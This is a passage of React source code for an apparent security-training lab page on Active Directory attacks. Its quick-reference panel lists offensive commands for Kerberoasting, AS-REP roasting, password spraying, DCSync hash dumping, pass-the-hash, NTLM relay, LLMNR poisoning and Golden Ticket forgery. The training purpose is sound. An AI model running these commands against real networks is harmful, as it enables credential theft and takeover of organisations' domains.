                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#5a1a0a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a3a' : '#5a1a0a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.6)' : '#5a1a0a'), borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.12)' : 'transparent', color: guidedDone ? accent : '#7a2a1a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,65,54,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#5a1a0a' }}>Complete all {steps.length} guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080604' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0806', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a2a1a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any Active Directory technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #5a1a0a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a2a1a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '&#9660;' : '&#9658;'} QUICK REFERENCE &#8212; ACTIVE DIRECTORY COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080604', border: '1px solid #2a0a08', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['enum4linux -a target_ip', 'SMB/RPC AD enumeration (null session)'],
                ['crackmapexec smb target --pass-pol', 'Get password policy'],
                ['impacket-GetNPUsers domain/ -usersfile users.txt', 'AS-REP Roasting'],
                ['impacket-GetUserSPNs domain/user:pass -request', 'Kerberoasting'],
                ['crackmapexec smb target -u users.txt -p Welcome1', 'Password spraying'],
                ['bloodhound-python -u user -p pass -d domain -c All', 'BloodHound collection'],
                ['impacket-secretsdump domain/admin:pass@dc_ip -just-dc-ntlm', 'DCSync all hashes'],
                ['hashcat -m 13100 tgs.hash rockyou.txt', 'Crack Kerberoast hashes'],
                ['hashcat -m 18200 asrep.hash rockyou.txt', 'Crack AS-REP hashes'],
                ['impacket-psexec admin@target -hashes :NTLM', 'Pass-the-Hash shell'],
                ['responder -I eth0 -rdwv', 'LLMNR/NBT-NS poisoning'],
                ['impacket-ntlmrelayx -tf targets.txt -smb2support', 'NTLM relay attack'],
                ['mimikatz kerberos::golden /user:fake /krbtgt:HASH', 'Golden Ticket forgery'],
                ['net user admin NewPass123! /domain', 'Reset AD password (GenericAll abuse)'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060402', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.68rem', flexShrink: 0, whiteSpace: 'pre' }}>{cmd}</code>
                  <span style={{ color: '#8a4a3a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #2a0a08', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a2a1a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a2a1a' }}>MOD-06 WEB ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
